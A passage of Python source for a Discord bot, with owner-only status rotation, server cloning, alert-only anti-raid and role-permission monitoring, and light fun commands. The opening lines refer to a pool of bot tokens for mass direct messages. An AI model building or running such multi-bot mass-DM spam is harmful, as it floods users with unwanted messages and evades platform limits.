                title=f"🔄 Dead Tokens — Reset Links ({len(dead)} bots)",
                description=chunk,
                color=COLORS["error"]
            ).set_footer(text="Click the link → Reset Token → copy → replace in MASSDM_BOT_TOKENS"))
    except Exception:
        pass


#  SETSTATUS — Owner only (set / rotate bot activity)
_STATUS_ROTATION: list[tuple[str, str]] = []   # [(activity_type, text), ...]
_STATUS_ROTATE_TASK: "asyncio.Task | None" = None

_ACTIVITY_MAP = {
    "playing":    lambda t: discord.Game(name=t),
    "watching":   lambda t: discord.Activity(type=discord.ActivityType.watching, name=t),
    "listening":  lambda t: discord.Activity(type=discord.ActivityType.listening, name=t),
    "competing":  lambda t: discord.Activity(type=discord.ActivityType.competing, name=t),
    "streaming":  lambda t: discord.Streaming(name=t, url="https://twitch.tv/polar"),
}

def _make_activity(atype: str, text: str):
    fn = _ACTIVITY_MAP.get(atype.lower())
    if fn:
        return fn(text)
    return discord.Game(name=text)

@bot.command(name="setstatus", aliases=["botstatus", "status"])
async def setstatus_cmd(ctx, subcommand: str = None, *args):
    global _STATUS_ROTATE_TASK, _STATUS_ROTATION

    if not has_owner_access(ctx.author):
        return await ctx.send(embed=discord.Embed(
            description="❌ Owner only.", color=COLORS["error"]))

    # ── rotate subcommands ──────────────────────────────────────────
    if subcommand and subcommand.lower() == "rotate":
        action = args[0].lower() if args else ""

        if action == "add":
            if len(args) < 3:
                return await ctx.send(embed=discord.Embed(
                    description="❌ Usage: `,setstatus rotate add <type> <text>`", color=COLORS["error"]))
            atype = args[1].lower(); text = " ".join(args[2:])
            if atype not in _ACTIVITY_MAP:
                return await ctx.send(embed=discord.Embed(
                    description=f"❌ Type must be one of: {', '.join(_ACTIVITY_MAP)}", color=COLORS["error"]))
            _STATUS_ROTATION.append((atype, text))
            return await ctx.send(embed=discord.Embed(
                description=f"✅ Added to rotation: **{atype}** — *{text}*  (total: {len(_STATUS_ROTATION)})",
                color=COLORS["success"]))

        if action == "list":
            if not _STATUS_ROTATION:
                return await ctx.send(embed=discord.Embed(
                    description="Rotation is empty. Use `,setstatus rotate add <type> <text>`.", color=COLORS["info"]))
            lines = "\n".join(f"`{i+1}.` **{t}** — {x}" for i, (t, x) in enumerate(_STATUS_ROTATION))
            return await ctx.send(embed=discord.Embed(title="🔄 Status Rotation", description=lines, color=0x5865F2))

        if action == "clear":
            _STATUS_ROTATION.clear()
            return await ctx.send(embed=discord.Embed(description="✅ Rotation cleared.", color=COLORS["success"]))

        if action == "stop":
            if _STATUS_ROTATE_TASK and not _STATUS_ROTATE_TASK.done():
                _STATUS_ROTATE_TASK.cancel()
                _STATUS_ROTATE_TASK = None
            return await ctx.send(embed=discord.Embed(description="⏹️ Rotation stopped.", color=COLORS["success"]))

        if action == "start":
            if not _STATUS_ROTATION:
                return await ctx.send(embed=discord.Embed(
                    description="❌ Rotation queue is empty — add entries first.", color=COLORS["error"]))
            if _STATUS_ROTATE_TASK and not _STATUS_ROTATE_TASK.done():
                _STATUS_ROTATE_TASK.cancel()

            async def _rotate_loop():
                idx = 0
                while True:
                    try:
                        atype, text = _STATUS_ROTATION[idx % len(_STATUS_ROTATION)]
                        await bot.change_presence(activity=_make_activity(atype, text))
                        idx += 1
                        await asyncio.sleep(30)
                    except asyncio.CancelledError:
                        break
                    except Exception:
                        await asyncio.sleep(30)

            _STATUS_ROTATE_TASK = asyncio.create_task(_rotate_loop())
            return await ctx.send(embed=discord.Embed(
                description=f"▶️ Rotation started — cycling {len(_STATUS_ROTATION)} status(es) every 30 s.",
                color=COLORS["success"]))

        return await ctx.send(embed=discord.Embed(
            description="❌ Unknown rotate action. Use: `add <type> <text>` · `start` · `stop` · `list` · `clear`",
            color=COLORS["error"]))

    # ── single static status ────────────────────────────────────────
    if not subcommand:
        return await ctx.send(embed=discord.Embed(
            description=(
                "**Usage:**\n"
                "`,setstatus <type> <text>` — set a static status\n"
                "`,setstatus rotate add <type> <text>` — queue a rotating status\n"
                "`,setstatus rotate start/stop/list/clear`\n\n"
                f"**Types:** {', '.join(_ACTIVITY_MAP)}"
            ), color=0x5865F2))

    atype = subcommand.lower()
    if atype not in _ACTIVITY_MAP:
        return await ctx.send(embed=discord.Embed(
            description=f"❌ Type must be one of: {', '.join(_ACTIVITY_MAP)}", color=COLORS["error"]))

    if not args:
        return await ctx.send(embed=discord.Embed(
            description="❌ Provide status text. e.g. `,setstatus playing CoolBot`", color=COLORS["error"]))

    text = " ".join(args)
    if _STATUS_ROTATE_TASK and not _STATUS_ROTATE_TASK.done():
        _STATUS_ROTATE_TASK.cancel(); _STATUS_ROTATE_TASK = None

    await bot.change_presence(activity=_make_activity(atype, text))
    await ctx.send(embed=discord.Embed(
        description=f"✅ Status set: **{atype}** — *{text}*",
        color=COLORS["success"]))


#  CLONESERVER — Owner only
@bot.command(name="cloneserver", aliases=["serverclone"])
async def cloneserver_cmd(ctx, source_id: int = None):
    is_allowed = has_owner_access(ctx.author)
    if not is_allowed:
        return await ctx.send(embed=discord.Embed(
            description="❌ This high-impact command is **Owner only**.", color=COLORS["error"]))

    if source_id is None:
        return await ctx.send(embed=discord.Embed(
            description=(
                "❌ Provide a source server ID.\n"
                "Usage: `,cloneserver <source_server_id>`\n"
                "The bot must be in both the source and target servers."
            ), color=COLORS["error"]))

    src = bot.get_guild(source_id)
    if src is None:
        return await ctx.send(embed=discord.Embed(
            description=f"❌ Bot is not in server `{source_id}`. Invite the bot there first.",
            color=COLORS["error"]))

    dst = ctx.guild
    if src.id == dst.id:
        return await ctx.send(embed=discord.Embed(
            description="❌ Source and target cannot be the same server.", color=COLORS["error"]))

    # Progress embed helper
    prog_msg = await ctx.send(embed=discord.Embed(
        title="🏗️ Server Clone Starting…",
        description=f"**Source:** {src.name} (`{src.id}`)\n**Target:** {dst.name} (`{dst.id}`)",
        color=0xFFA500))

    async def _update(text: str, color: int = 0xFFA500):
        try:
            await prog_msg.edit(embed=discord.Embed(
                title="🏗️ Cloning…", description=text, color=color))
        except Exception:
            pass

    roles_created  = 0
    chans_created  = 0
    errors         = 0

    # ── 1. Clone roles (skip @everyone and bot-managed) ──────────────
    await _update("**Step 1/3** — Cloning roles…")
    role_map: dict[int, discord.Role] = {}   # src role id → new dst role
    sorted_roles = sorted(
        [r for r in src.roles if not r.is_default() and not r.managed],
        key=lambda r: r.position,
    )
    for role in sorted_roles:
        try:
            new_role = await dst.create_role(
                name=role.name,
                color=role.color,
                hoist=role.hoist,
                mentionable=role.mentionable,
                permissions=role.permissions,
                reason=f"Coolbot cloneserver from {src.name}",
            )
            role_map[role.id] = new_role
            roles_created += 1
            await asyncio.sleep(0.8)
        except Exception:
            errors += 1

    await _update(f"**Step 1/3 done** — {roles_created} roles created  ({errors} skipped)\n**Step 2/3** — Cloning categories…")

    # ── 2. Clone categories first ────────────────────────────────────
    cat_map: dict[int, discord.CategoryChannel] = {}
    for ch in [c for c in src.channels if isinstance(c, discord.CategoryChannel)]:
        try:
            overwrites = {}
            for target, overwrite in ch.overwrites.items():
                if isinstance(target, discord.Role):
                    mapped = role_map.get(target.id)
                    if mapped:
                        overwrites[mapped] = overwrite
                elif isinstance(target, discord.Member) and target.id == ctx.author.id:
                    overwrites[ctx.author] = overwrite
            new_cat = await dst.create_category(
                name=ch.name,
                overwrites=overwrites,
                reason=f"Coolbot cloneserver from {src.name}",
            )
            cat_map[ch.id] = new_cat
            chans_created += 1
            await asyncio.sleep(0.6)
        except Exception:
            errors += 1

    await _update(
        f"**Step 1/3 done** — {roles_created} roles\n"
        f"**Step 2/3 done** — {sum(1 for c in src.channels if isinstance(c, discord.CategoryChannel))} categories\n"
        "**Step 3/3** — Cloning text & voice channels…"
    )

    # ── 3. Clone text + voice channels ──────────────────────────────
    non_cats = [c for c in src.channels if not isinstance(c, discord.CategoryChannel)]
    for ch in non_cats:
        try:
            parent = cat_map.get(ch.category_id) if ch.category_id else None
            overwrites = {}
            for target, overwrite in ch.overwrites.items():
                if isinstance(target, discord.Role):
                    mapped = role_map.get(target.id)
                    if mapped:
                        overwrites[mapped] = overwrite

            if isinstance(ch, discord.TextChannel):
                await dst.create_text_channel(
                    name=ch.name,
                    category=parent,
                    topic=ch.topic,
                    slowmode_delay=ch.slowmode_delay,
                    nsfw=ch.is_nsfw(),
                    overwrites=overwrites,
                    reason=f"Coolbot cloneserver from {src.name}",
                )
            elif isinstance(ch, discord.VoiceChannel):
                await dst.create_voice_channel(
                    name=ch.name,
                    category=parent,
                    bitrate=min(ch.bitrate, dst.bitrate_limit),
                    user_limit=ch.user_limit,
                    overwrites=overwrites,
                    reason=f"Coolbot cloneserver from {src.name}",
                )
            chans_created += 1
            await asyncio.sleep(0.6)
        except Exception:
            errors += 1

    # ── Done ─────────────────────────────────────────────────────────
    final_e = discord.Embed(
        title="✅ Server Clone Complete!",
        description=(
            f"**Source:** {src.name}\n"
            f"**Target:** {dst.name}\n\n"
            f"🎭 Roles created: **{roles_created}**\n"
            f"📁 Channels created: **{chans_created}**\n"
            f"⚠️ Errors / skipped: **{errors}**"
        ),
        color=COLORS["success"],
    )
    final_e.set_footer(text="Some channels may need manual permission adjustments.")
    await prog_msg.edit(embed=final_e)


# ── MIKASA_INSANE_SECURITY_PATCH_V1 ───────────────────────────────────────
# Additive safety improvements: alerts and diagnostics; no destructive auto-actions.
_MIKASA_SECURITY_ALERT_COOLDOWNS = {}
_MIKASA_STARTED_AT = time.monotonic()
_MIKASA_DANGEROUS_PERMS = (
    "administrator", "manage_guild", "manage_roles", "manage_channels",
    "ban_members", "kick_members", "manage_webhooks", "manage_messages",
    "mention_everyone", "moderate_members",
)

async def _mikasa_security_alert(guild: discord.Guild, title: str, details: str):
    """Send a rate-limited security alert to configured antinuke channel or owner DM."""
    try:
        now = time.monotonic()
        key = (guild.id, title, details[:100])
        if now - _MIKASA_SECURITY_ALERT_COOLDOWNS.get(key, 0) < 20:
            return
        _MIKASA_SECURITY_ALERT_COOLDOWNS[key] = now
        # Bound memory use if a server generates many different alerts.
        if len(_MIKASA_SECURITY_ALERT_COOLDOWNS) > 1000:
            cutoff = now - 600
            for old_key, stamp in list(_MIKASA_SECURITY_ALERT_COOLDOWNS.items()):
                if stamp < cutoff:
                    _MIKASA_SECURITY_ALERT_COOLDOWNS.pop(old_key, None)
        embed = discord.Embed(
            title=title[:250], description=details[:3800],
            color=0xFEE75C, timestamp=discord.utils.utcnow()
        )
        embed.set_footer(text="Mikasa 2.0 • Security alert — review audit logs before acting")
        settings = load("server_settings")
        gs = gdata(settings, guild.id)
        channel_id = gs.get("mikasa_all_logs_channel") or gs.get("security_log_channel") or gs.get("antinuke_channel") or gs.get("antinuke_alert_channel")
        channel = guild.get_channel(int(channel_id)) if str(channel_id or "").isdigit() else None
        if channel and hasattr(channel, "send"):
            await channel.send(embed=embed)
            return
        try:
            owner = await bot.fetch_user(guild.owner_id)
            await owner.send(embed=embed)
        except Exception:
            print(f"[Mikasa security] Could not deliver alert for guild {guild.id}; configure ,antinuke setchannel.")
    except Exception as exc:
        print(f"[Mikasa security] alert error for guild {getattr(guild, 'id', '?')}: {exc}")

async def _mikasa_recent_audit_actor(guild: discord.Guild, action):
    """Best-effort audit-log actor lookup. Returns None if permissions/data unavailable."""
    try:
        async for entry in guild.audit_logs(limit=6, action=action):
            created = entry.created_at
            if created and (discord.utils.utcnow() - created).total_seconds() <= 12:
                return entry.user
    except Exception:
        return None
    return None

@bot.listen("on_guild_role_create")
async def _mikasa_alert_powerful_role_create(role: discord.Role):
    try:
        settings = load("server_settings")
        gs = gdata(settings, role.guild.id)
        if not gs.get("antinuke_enabled", False):
            return
        granted = [name.replace("_", " ").title() for name in _MIKASA_DANGEROUS_PERMS
                   if getattr(role.permissions, name, False)]
        if not granted:
            return
        actor = await _mikasa_recent_audit_actor(role.guild, discord.AuditLogAction.role_create)
        whitelist = gs.get("antinuke_whitelist", [])
        if actor and str(actor.id) in {str(x) for x in whitelist}:
            return
        # Skip bots/users approved with ,botallow / ,allowbot (and bots they add)
        if actor and _mikasa_is_allowed_bot_or_inviter(role.guild, int(actor.id)):
            return
        if role.managed:
            # Integration role for an allowed bot — do not alert
            try:
                # role tags.bot_id may identify the bot that owns this managed role
                bot_owner_id = getattr(getattr(role, "tags", None), "bot_id", None)
                if bot_owner_id and _mikasa_is_allowed_bot_or_inviter(role.guild, int(bot_owner_id)):
                    return
            except Exception:
                pass
        actor_label = f"{actor} (`{actor.id}`)" if actor else "Unknown (audit log unavailable)"
        await _mikasa_security_alert(
            role.guild, "⚠️ Powerful Role Created",
            f"Role: **{role.name}** (`{role.id}`)\nCreated by: {actor_label}\n"
            f"Powerful permissions: {', '.join(granted)}\n\n"
            "No automatic punishment was applied. Verify the audit log and remove unexpected permissions."
        )
    except Exception as exc:
        print(f"[Mikasa security] role-create listener error: {exc}")

@bot.listen("on_guild_role_update")
async def _mikasa_alert_powerful_role_update(before: discord.Role, after: discord.Role):
    try:
        settings = load("server_settings")
        gs = gdata(settings, after.guild.id)
        if not gs.get("antinuke_enabled", False):
            return
        gained = [name.replace("_", " ").title() for name in _MIKASA_DANGEROUS_PERMS
                  if not getattr(before.permissions, name, False)
                  and getattr(after.permissions, name, False)]
        if not gained:
            return
        actor = await _mikasa_recent_audit_actor(after.guild, discord.AuditLogAction.role_update)
        actor_label = f"{actor} (`{actor.id}`)" if actor else "Unknown (audit log unavailable)"
        await _mikasa_security_alert(
            after.guild, "🚨 Dangerous Role Permission Change",
            f"Role: **{after.name}** (`{after.id}`)\nChanged by: {actor_label}\n"
            f"New powerful permissions: {', '.join(gained)}\n\n"
            "No automatic punishment was applied. Review the audit log and revoke unexpected permissions."
        )
    except Exception as exc:
        print(f"[Mikasa security] role-update listener error: {exc}")

@bot.hybrid_command(name="fastping", aliases=["latency"], description="Show Mikasa's live gateway latency")
async def _mikasa_fastping(ctx):
    ms = round(bot.latency * 1000) if bot.latency is not None else -1
    color = COLORS.get("success", 0x57F287) if 0 <= ms < 250 else COLORS.get("warning", 0xFEE75C)
    await ctx.send(embed=discord.Embed(
        title="⚡ Mikasa Latency",
        description=f"Gateway latency: **{ms} ms**\nStatus: **{'Connected' if bot.is_ready() else 'Connecting'}**",
        color=color,
    ))

@bot.hybrid_command(name="botstats", aliases=["mikasa", "botinfo"], description="Show Mikasa uptime and bot statistics")
async def _mikasa_botstats(ctx):
    uptime = max(0, int(time.monotonic() - _MIKASA_STARTED_AT))
    days, rem = divmod(uptime, 86400)
    hours, rem = divmod(rem, 3600)
    minutes, seconds = divmod(rem, 60)
    embed = discord.Embed(title="📊 Mikasa 2.0 Status", color=0x5865F2)
    embed.add_field(name="Uptime", value=f"{days}d {hours}h {minutes}m {seconds}s", inline=True)
    embed.add_field(name="Latency", value=f"{round(bot.latency * 1000)} ms" if bot.latency is not None else "Unavailable", inline=True)
    embed.add_field(name="Servers", value=str(len(bot.guilds)), inline=True)
    embed.add_field(name="Users (cached)", value=str(len(bot.users)), inline=True)
    embed.add_field(name="Commands", value=str(len(bot.commands)), inline=True)
    embed.add_field(name="Python", value=sys.version.split()[0], inline=True)
    await ctx.send(embed=embed)

@bot.hybrid_command(name="securitycheck", aliases=["secstatus"], description="Check security settings and bot permissions")
@commands.guild_only()
@commands.has_permissions(administrator=True)
async def _mikasa_securitycheck(ctx):
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send("🔒 Premium Access required. Ask the server owner for the **Premium Access** role.", ephemeral=bool(getattr(ctx, "interaction", None)))
    guild = ctx.guild
    me = guild.me
    settings = load("server_settings")
    gs = gdata(settings, guild.id)
    perms = me.guild_permissions if me else None
    missing = []
    if perms:
        for label, attr in (
            ("View Audit Log", "view_audit_log"), ("Manage Roles", "manage_roles"),
            ("Manage Channels", "manage_channels"), ("Kick Members", "kick_members"),
            ("Ban Members", "ban_members"), ("Moderate Members", "moderate_members"),
            ("View Channels", "view_channel"), ("Send Messages", "send_messages"),
        ):
            if not getattr(perms, attr, False):
                missing.append(label)
    enabled = bool(gs.get("antinuke_enabled", False))
    channel_id = gs.get("antinuke_channel") or gs.get("antinuke_alert_channel")
    alert_channel = guild.get_channel(int(channel_id)) if str(channel_id or "").isdigit() else None
    embed = discord.Embed(title="🛡️ Mikasa Security Check", color=0x5865F2)
    embed.add_field(name="Anti-nuke", value="✅ Enabled" if enabled else "⚠️ Disabled", inline=True)
    embed.add_field(name="Alert channel", value=alert_channel.mention if alert_channel else "⚠️ Not configured", inline=True)
    embed.add_field(name="Audit log access", value=("✅ Available" if perms and perms.view_audit_log else "❌ Missing View Audit Log"), inline=True)
    embed.add_field(name="Missing bot permissions", value="\n".join(f"• {x}" for x in missing) if missing else "✅ None of the checked permissions are missing", inline=False)
    embed.add_field(name="Important", value="This is a configuration check, not a guarantee of complete protection. Keep the bot role below trusted staff roles and enable 2FA for moderators.", inline=False)
    await ctx.send(embed=embed, ephemeral=bool(getattr(ctx, "interaction", None)))



# ── MIKASA_ULTIMATE_SECURITY_PATCH_V1 ────────────────────────────────────
# Defensive, alert-first tools. These do not automatically punish members.
_MIKASA_RAID_JOIN_TIMES = defaultdict(list)
_MIKASA_RAID_ALERTED_AT = {}

@bot.hybrid_command(name="securityhelp", description="List Mikasa's security commands")
@commands.guild_only()
async def _mikasa_securityhelp(ctx):
    embed = discord.Embed(
        title="🛡️ Mikasa Security Commands",
        description=(
            "`,securitycheck` — inspect security configuration and bot permissions\n"
            "`,setsecuritylog #channel` — choose where security alerts are sent\n"
            "`,securitytest` — send a test alert to verify delivery\n"
            "`,raidwatch on|off|status` — enable or inspect join-burst alerts\n"
            "`,raidwatch threshold 8` — set the join-alert threshold (5–25)\n"
            "`,auditrecent` — show recent audit-log entries (requires View Audit Log)\n"
            "`,fastping` — gateway latency\n`,botstats` — uptime and statistics\n\n"
            "Security alerts are detection/notification, not a guarantee or automatic punishment."
        ),
        color=0x5865F2,
    )
    await ctx.send(embed=embed, ephemeral=bool(getattr(ctx, "interaction", None)))

@bot.hybrid_command(name="setsecuritylog", description="Set the security alert channel")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _mikasa_setsecuritylog(ctx, channel: discord.TextChannel):
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send("🔒 Premium Access required. Ask the server owner for the **Premium Access** role.", ephemeral=bool(getattr(ctx, "interaction", None)))
    if not channel.permissions_for(ctx.guild.me).send_messages or not channel.permissions_for(ctx.guild.me).embed_links:
        return await ctx.send("❌ I need Send Messages and Embed Links in that channel.", ephemeral=bool(getattr(ctx, "interaction", None)))
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    gs["security_log_channel"] = channel.id
    # Also update the established anti-nuke alert key so existing security alerts use this channel.
    gs["antinuke_channel"] = channel.id
    save("server_settings", settings)
    await ctx.send(f"✅ Security alerts will be sent to {channel.mention}.", ephemeral=bool(getattr(ctx, "interaction", None)))

@bot.hybrid_command(name="securitytest", description="Send a test security alert")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _mikasa_securitytest(ctx):
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send("🔒 Premium Access required. Ask the server owner for the **Premium Access** role.", ephemeral=bool(getattr(ctx, "interaction", None)))
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    channel_id = gs.get("mikasa_all_logs_channel") or gs.get("security_log_channel") or gs.get("antinuke_channel") or gs.get("antinuke_alert_channel")
    channel = ctx.guild.get_channel(int(channel_id)) if str(channel_id or "").isdigit() else None
    if not channel:
        return await ctx.send("⚠️ No security log channel is configured. Run `,setsecuritylog #channel` first.", ephemeral=bool(getattr(ctx, "interaction", None)))
    try:
        await channel.send(embed=discord.Embed(
            title="🧪 Mikasa Security Test Alert",
            description=f"Alert delivery test requested by {ctx.author.mention}. If you can read this, the configured channel is working.",
            color=0x57F287,
            timestamp=discord.utils.utcnow(),
        ))
        await ctx.send(f"✅ Test alert sent to {channel.mention}.", ephemeral=bool(getattr(ctx, "interaction", None)))
    except discord.Forbidden:
        await ctx.send("❌ I can't post in that channel. Check Send Messages and Embed Links permissions.", ephemeral=bool(getattr(ctx, "interaction", None)))

@bot.hybrid_command(name="raidwatch", description="Configure join-burst security alerts")
@commands.guild_only()
@commands.has_guild_permissions(manage_guild=True)
async def _mikasa_raidwatch(ctx, action: str = "status", value: int = None):
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send("🔒 Premium Access required. Ask the server owner for the **Premium Access** role.", ephemeral=bool(getattr(ctx, "interaction", None)))
    settings = load("server_settings")
    gs = gdata(settings, ctx.guild.id)
    action = (action or "status").lower()
    if action in ("on", "enable", "start"):
        gs["raidwatch_enabled"] = True
        save("server_settings", settings)
        await ctx.send("✅ RaidWatch enabled. I'll alert on a burst of new joins; no one is auto-kicked.", ephemeral=bool(getattr(ctx, "interaction", None)))
    elif action in ("off", "disable", "stop"):
        gs["raidwatch_enabled"] = False
        save("server_settings", settings)
        await ctx.send("⚠️ RaidWatch disabled.", ephemeral=bool(getattr(ctx, "interaction", None)))
    elif action in ("threshold", "limit"):
        if value is None or not 5 <= value <= 25:
            return await ctx.send("Use `,raidwatch threshold 8` (choose a number from 5 to 25).", ephemeral=bool(getattr(ctx, "interaction", None)))
        gs["raidwatch_threshold"] = int(value)
        save("server_settings", settings)
        await ctx.send(f"✅ RaidWatch alert threshold set to **{value} joins in 15 seconds**.", ephemeral=bool(getattr(ctx, "interaction", None)))
    elif action == "status":
        enabled = bool(gs.get("raidwatch_enabled", False))
        threshold = int(gs.get("raidwatch_threshold", 8) or 8)
        await ctx.send(f"🛡️ RaidWatch: **{'ON' if enabled else 'OFF'}** · alert threshold: **{threshold} joins / 15 seconds**. Alerts only; no automatic punishment.", ephemeral=bool(getattr(ctx, "interaction", None)))
    else:
        await ctx.send("Usage: `,raidwatch on`, `,raidwatch off`, `,raidwatch status`, or `,raidwatch threshold 8`.", ephemeral=bool(getattr(ctx, "interaction", None)))

@bot.hybrid_command(name="auditrecent", description="Show recent server audit-log entries")
@commands.guild_only()
@commands.has_guild_permissions(view_audit_log=True)
async def _mikasa_auditrecent(ctx):
    if not _mikasa_has_premium_access(ctx):
        return await ctx.send("🔒 Premium Access required. Ask the server owner for the **Premium Access** role.", ephemeral=bool(getattr(ctx, "interaction", None)))
    lines = []
    try:
        async for entry in ctx.guild.audit_logs(limit=10):
            actor = getattr(entry, "user", None)
            target = getattr(entry, "target", None)
            reason = (getattr(entry, "reason", None) or "No reason given").replace("\n", " ")
            when = entry.created_at.strftime("%H:%M:%S UTC") if entry.created_at else "time unknown"
            lines.append(f"`{when}` **{str(entry.action).replace('AuditLogAction.', '')}** · {actor or 'Unknown'} → {str(target)[:70] if target else '—'}\nReason: {reason[:120]}")
    except discord.Forbidden:
        return await ctx.send("❌ I need the View Audit Log permission to read these entries.", ephemeral=bool(getattr(ctx, "interaction", None)))
    if not lines:
        return await ctx.send("No audit-log entries were returned, or I lack access.", ephemeral=bool(getattr(ctx, "interaction", None)))
    embed = discord.Embed(title="🧾 Recent Audit Log", description="\n\n".join(lines)[:4000], color=0x5865F2)
    await ctx.send(embed=embed, ephemeral=bool(getattr(ctx, "interaction", None)))

@bot.listen("on_member_join")
async def _mikasa_raidwatch_join_alert(member: discord.Member):
    """Alert on a configurable burst of joins; deliberately takes no punitive action."""
    try:
        settings = load("server_settings")
        gs = gdata(settings, member.guild.id)
        if not gs.get("raidwatch_enabled", False):
            return
        now = time.monotonic()
        joins = _MIKASA_RAID_JOIN_TIMES[member.guild.id]
        joins[:] = [stamp for stamp in joins if now - stamp <= 15]
        joins.append(now)
        threshold = max(5, min(25, int(gs.get("raidwatch_threshold", 8) or 8)))
        last_alert = _MIKASA_RAID_ALERTED_AT.get(member.guild.id, 0)
        if len(joins) >= threshold and now - last_alert >= 60:
            _MIKASA_RAID_ALERTED_AT[member.guild.id] = now
            await _mikasa_security_alert(
                member.guild,
                "⚠️ RaidWatch: Join Burst Detected",
                f"**{len(joins)} members joined within 15 seconds** (threshold: {threshold}).\n"
                "No automatic punishment was applied. Review the member list and audit/moderation logs."
            )
    except Exception as exc:
        print(f"[Mikasa RaidWatch] listener error: {exc}")


# ── Extra fun commands (no external dependencies; no real-money gambling) ──
@bot.command(name="magic8ball", aliases=["8ball"])
async def _mikasa_magic8ball(ctx, *, question: str = ""):
    if not question.strip():
        return await ctx.send(f"Ask a question: `{PREFIX}magic8ball will I win my next game?`")
    answers = [
        "Absolutely ✨", "Looks likely 🌟", "The odds look good 🎯", "Ask again in a bit 🔮",
        "Hard to tell right now 🌫️", "Probably not 😅", "The signs say no 🙃", "Definitely not today 🌧️",
    ]
    embed = discord.Embed(title="🔮 Magic 8 Ball", color=COLORS.get("main", 0x5865F2))
    embed.add_field(name="Question", value=question[:1000], inline=False)
    embed.add_field(name="Answer", value=random.choice(answers), inline=False)
    await ctx.send(embed=embed)

@bot.command(name="choose")
async def _mikasa_choose(ctx, *, options: str = ""):
    choices = [item.strip() for item in options.split("|") if item.strip()]
    if len(choices) < 2:
        return await ctx.send(f"Give at least two options separated by `|`. Example: `{PREFIX}choose Miku | Mikasa`")
    if len(choices) > 20:
        return await ctx.send("Please provide no more than 20 options.")
    picked = random.choice(choices)
    await ctx.send(embed=discord.Embed(title="🎯 Random Choice", description=f"I choose: **{picked[:900]}**", color=COLORS.get("success", 0x57F287)))

@bot.command(name="dice")
async def _mikasa_dice(ctx, sides: int = 6):
    if not 2 <= sides <= 1000:
        return await ctx.send("Choose a die size between 2 and 1000. Example: `,dice 20`")
    result = random.randint(1, sides)
    await ctx.send(embed=discord.Embed(title="🎲 Dice Roll", description=f"You rolled **{result}** on a **{sides}**-sided die.", color=COLORS.get("main", 0x5865F2)))

@bot.command(name="compliment")
async def _mikasa_compliment(ctx, member: discord.Member = None):
    target = member or ctx.author
    lines = ["You bring good energy to the server ✨", "Your presence makes the community better 🌟", "You deserve a little appreciation today 💙", "You have a great sense of style 🎨", "Keep being your wonderfully unique self 🚀"]
    await ctx.send(f"💌 {target.mention}, {random.choice(lines)}")

@bot.command(name="roast")
async def _mikasa_roast(ctx, member: discord.Member = None):
    target = member or ctx.author
    lines = ["your Wi-Fi has more stable connections than you 😂", "you bring tutorial-level chaos to every game 🎮", "your loading screen has a loading screen ⏳", "even the bot needed a second to process that move 🤖", "your aim is powered by guesswork 🎯"]
    await ctx.send(f"🔥 {target.mention}, {random.choice(lines)} (just a joke!)")

_MIKASA_RIDDLES = [
    ("What has keys but can't open locks?", "A piano"),
    ("What gets wetter the more it dries?", "A towel"),
    ("What has a face and two hands but no arms or legs?", "A clock"),
    ("What has to be broken before you can use it?", "An egg"),
    ("What goes up but never comes down?", "Your age"),
]
@bot.command(name="riddle")
async def _mikasa_riddle(ctx):
    question, answer = random.choice(_MIKASA_RIDDLES)
    await ctx.send(embed=discord.Embed(title="🧩 Mikasa's Riddle", description=f"{question}\n\nAnswer: ||{answer}||", color=COLORS.get("info", 0x5865F2)))

@bot.command(name="luckyspin")
async def _mikasa_luckyspin(ctx):
    # Purely for fun: no wager, no currency changes, and no real-world value.
    results = ["🌟 Legendary vibes", "🍀 Super lucky", "🎮 Main-character energy", "💎 Rare drop energy", "✨ Clean sweep", "🌀 Chaos mode", "🌈 Good vibes only", "🎯 Perfect timing"]
    await ctx.send(embed=discord.Embed(title="🎡 Free Lucky Spin", description=f"Your result: **{random.choice(results)}**\n\nNo bet or coins required—just for fun.", color=COLORS.get("main", 0x5865F2)))


# ── Safe, opt-in Truth & Dare games ──────────────────────────────────────
_MIKASA_TRUTHS = [
    "What's a small thing that always makes your day better?",
    "What's a skill you'd love to learn?",
    "What's your funniest harmless gaming moment?",
    "Which fictional world would you visit for one day?",
    "What's a song or game you never get tired of?",
    "What's one achievement you're proud of?",
    "What's the kindest thing someone has done for you?",
    "If you could instantly master one hobby, what would it be?",
    "What's your most-used emoji, and why?",
    "What's a funny misconception people have about your favorite game?",
    "Would you rather explore space or the deep ocean? Why?",
    "What's one positive goal you have for this month?",
]
_MIKASA_DARES = [
    "Describe your favorite game like a dramatic movie trailer.",
    "Send three emojis that describe your mood—no explanation needed.",
    "Write a sentence using the words 'dragon', 'pizza', and 'victory'.",
    "Give someone in the chat a genuine, friendly compliment.",
    "Invent a new name for Mikasa and explain it in one sentence.",
    "Talk like a game-show host for your next message.",
    "Share a harmless fun fact about a hobby you enjoy.",
    "Describe your favorite character using only five words.",
    "Make up a two-line victory chant for your team.",
    "Use only emojis to describe your favorite food.",
    "Type a tongue twister once, then share how it went.",
    "Recommend a game, book, or show and give one reason why.",
]

@bot.command(name="truth", aliases=["todtruth"])
async def _mikasa_truth(ctx):
    """Get a light, safe truth prompt. Players may always pass."""
    prompt = random.choice(_MIKASA_TRUTHS)
    embed = discord.Embed(title="💬 Truth", description=f"{ctx.author.mention}, {prompt}\n\n*You can always pass or choose another prompt.*", color=COLORS.get("main", 0x5865F2))
    await ctx.send(embed=embed)

@bot.command(name="dare", aliases=["toddare"])
async def _mikasa_dare(ctx):
    """Get a harmless, optional dare; no dangerous or invasive tasks."""
    prompt = random.choice(_MIKASA_DARES)
    embed = discord.Embed(title="🎯 Dare", description=f"{ctx.author.mention}, {prompt}\n\n*Keep it friendly. You can pass or choose another dare.*", color=COLORS.get("success", 0x57F287))
    await ctx.send(embed=embed)

@bot.command(name="truthordare", aliases=["tod", "truth-or-dare"])
async def _mikasa_truth_or_dare(ctx, choice: str = ""):
    """Choose truth or dare, or let Mikasa choose randomly."""
    choice = choice.strip().casefold()
    if choice in {"truth", "t"}:
        return await _mikasa_truth(ctx)
    if choice in {"dare", "d"}:
        return await _mikasa_dare(ctx)
    if choice and choice not in {"random", "either", ""}:
        return await ctx.send(f"Choose `truth`, `dare`, or `random`: `{PREFIX}truthordare truth`.")
